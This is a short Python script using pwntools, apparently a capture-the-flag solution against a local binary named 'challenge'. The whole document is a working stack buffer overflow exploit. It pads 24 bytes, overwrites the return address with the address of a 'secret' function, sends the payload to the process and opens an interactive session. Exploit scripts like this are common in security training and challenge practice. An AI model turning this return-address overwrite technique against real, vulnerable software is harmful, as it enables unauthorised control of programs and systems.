
from pwn import *

elf = ELF('./challenge')
rop = ROP(elf)
offset = 16 + 8
addr_function = elf.symbols['secret']
print(hex(addr_function))

payload = flat(
    b'A' * offset,
    addr_function
)

print(payload)

io = elf.process()

io.sendline(payload)
io.interactive()
